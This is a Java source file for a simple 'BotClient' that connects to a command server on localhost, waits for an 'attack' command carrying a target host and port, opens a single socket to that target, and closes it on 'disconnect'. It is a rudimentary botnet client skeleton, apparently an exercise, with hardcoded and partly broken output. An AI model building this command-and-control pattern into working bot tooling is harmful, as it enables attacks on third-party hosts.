package client;

import java.io.BufferedInputStream;
import java.io.BufferedOutputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.net.InetAddress;
import java.net.Socket;
import java.net.UnknownHostException;
import java.util.Scanner;

public class BotClient {

	public static void main(String args[]) throws UnknownHostException, IOException {
		/** Define a host server */
	    String host = "localhost";
	    /** Define a port */
	    int port = 19999;

	    StringBuffer instr = new StringBuffer();
	    String TimeStamp;
	    System.out.println("SocketClient initialized");
	    
	    try {
	        InetAddress address = InetAddress.getByName(host);
	        Socket connection = new Socket(address, port);
	               
	            BufferedInputStream bis = new BufferedInputStream(connection.
	                getInputStream());
	            
	            InputStreamReader isr = new InputStreamReader(bis, "US-ASCII");

	            //Appending the inputdatastream
	            int c;
	            while ( (c = isr.read()) != 13)
	              instr.append( (char) c);

	            System.out.println(instr);
	            
	            //Keeping the socket listening
	            while(!isr.ready()){
	            	
	            }
	            
	            System.out.println("Break the loop");
	            instr=new StringBuffer();
	            
	            while ( (c = isr.read()) != 13)
		              instr.append( (char) c);
	            
	            String input = instr.toString();
	            String[] elements = input.split(" ");
	            String command = elements[0];
	            String hostAddress=elements[1];
	            String hostPort=elements[2];
	            
	            //For attacking the host
	            Socket connectionToTargetHost=null;
	            if(command.equalsIgnoreCase("attack")){
	            	 connectionToTargetHost = new Socket(InetAddress.getByName(hostAddress), 
	            			Integer.parseInt(hostPort));
	            	System.out.println("Connection established to google.com");
	            }
	            
	            System.out.println(instr);
	            
	            instr=new StringBuffer();
	            
	            //Keeping the socket listening
	            while(!isr.ready()){
	            	
	            }
	            
	            while ( (c = isr.read()) != 13)
		              instr.append( (char) c);
	            
	            String input1 = instr.toString();
	            String[] elements1 = input1.split(" ");
	            String command1 = elements1[0];
	            String hostAddress1=elements1[1];
	            String hostPort1=elements1[2];
	            
	            if(command1.equalsIgnoreCase("disconnect")){
	            	connectionToTargetHost.close();
	            	System.out.println("Connection to the host closed");
	            }
	            
	            
	            
	            
	            /** Close the socket connection. */
	            //connection.close();
	           }
	          catch (IOException f) {
	            System.out.println("IOException: " + f);
	          }
	          catch (Exception g) {
	            System.out.println("Exception: " + g);
	          }
	        }
	}